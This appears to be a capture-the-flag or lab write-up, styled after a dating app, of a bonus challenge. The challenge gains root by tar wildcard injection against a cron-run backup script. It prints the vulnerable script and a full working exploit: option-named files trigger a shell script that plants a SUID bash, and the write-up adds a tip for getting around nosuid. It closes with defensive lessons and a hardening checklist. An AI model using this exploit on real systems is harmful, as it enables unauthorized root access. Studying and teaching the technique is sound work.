⭐ Bonus — Root via Tar Wildcard Injection

Privilege escalation

Goal: escalate from student to root by abusing wildcard expansion in a root-run backup script.

"Crime: Swipe Right."
@MagicalSparkle · wildcard injection is very much a crime
Discovery A root-run script in /opt/backup.sh tars /home/student using *. Wildcards are expanded by the shell before tar runs — allowing filename-based argument injection. 
#!/bin/bash
# Backup script — runs as root via cron
BACKUP_DIR="/opt/backups"
cd /home/student
tar -czf "$BACKUP_DIR/backup_$(date +%Y%m%d_%H%M%S).tar.gz" * 2>/dev/null
Exploit Create files named like tar options so that * expands into attacker-controlled flags. 
# 1) Place malicious filenames in /home/student
cd /home/student
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=./shell.sh"

# 2) Payload: create a SUID bash outside /tmp (avoid nosuid)
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /home/student/rootbash
chmod 4755 /home/student/rootbash
EOF
chmod +x shell.sh

# 3) Wait for cron to run the backup script (every minute)
ls -lt /opt/backups | head

# 4) Pop root
/home/student/rootbash -p
whoami
cat /root/inside.md
Gotcha solved SUID in /tmp often fails due to nosuid mount option. Writing the SUID binary to /home/student avoids that.
💘 SWIPE RIGHT — ROOT OBTAINED

🧠 Real-world Lessons

Defense
"Swipe right if you like claws and chaos."
@Nyra · defenders who harden their stack correctly
  • Never trust the client: anything shipped in an APK can be recovered
  • Tokens are passwords: treat bot tokens like production secrets (rotation, least privilege, vaulting)
  • Logs are liabilities: eliminate plaintext creds; scrub PII; enforce retention and encryption
  • "Internal only" isn't a boundary: once credentials leak, attackers pivot across layers
  • Avoid wildcard foot-guns: never run archivers on attacker-controlled directories with bare *
Hardening checklist Remove debug endpoints · Reduce bot permissions · Sanitize logs · Rotate credentials · Review all root automation scripts for shell expansion hazards
